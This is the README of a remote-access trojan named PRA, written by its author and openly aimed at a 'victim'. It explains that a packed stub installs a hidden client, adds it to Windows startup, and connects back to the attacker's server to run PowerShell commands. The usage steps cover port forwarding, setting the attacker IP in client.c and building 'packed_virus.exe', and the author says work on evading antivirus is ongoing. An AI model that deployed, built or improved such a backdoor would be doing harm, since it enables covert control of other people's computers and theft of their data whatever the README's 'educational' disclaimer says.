# Powershell Remote Access (PRA)
PRA is a program (or Trojan virus) that allows access to the victim's Powershell. The program is in early access, as its development has just begun. When using it, you may encounter a lot of errors and nuances, please write about it. Also, please use this program for educational purposes, do not use it to harm anyone.

## How it works
We have 2 executable files. The first file is the client, and the second is the server. The client file must be located and running on the victim's computer. The server file must be located and running on the control computer. The client file will constantly try to connect to the server and if the connection is successfully established, the server will be able to send commands to the client, which it will execute through the victim's Powershell and send the result back to the server.

Now let's talk about the additional elements of PRA. The executable file that must be opened by the victim is called a stub. The purpose of the stub is to recreate the client on the system, which is stored directly on it. In order to "put" the machine code into the stub, we need a packer. In addition to unpacking the client, the stub also adds it to Windows startup.

## How to use
The first and most important thing you need to do for the program to work is to forward port 1488 (if the server and client are on the same computer, then this is not necessary). Next, open the client.c file and enter your IP address in quotes in the line below:

```
sai.sin_addr.S_un.S_addr = inet_addr("your ip here or "127.0.0.1" if you are testing the program on a local computer");
```

After all of the above, you need to compile the client.c file. I use GCC to compile, and if you do the same, just run run.bat in the client folder. Then go to the "build" folder and run "build.bat". "packed_virus.exe" file is a stub with a client built into it.

## Notes
Since this is a very early version, it has many shortcomings. Some of them are listed below.

- Unicode. In all the tests I've done, commands like "dir" output Unicode normally, but if we enter a command to output the contents of a file, like "Get-Content", Unicode may or may not be output normally. You need to experiment with the -Encoding parameter.
- Antivirus detection. The application is very easily detected by antivirus, so if the victim has an antivirus on their computer, it will easily make PRA inoperable.

I'm trying to fix the above issues. [If you want to support the author and speed up the development process](https://www.donationalerts.com/r/potichek).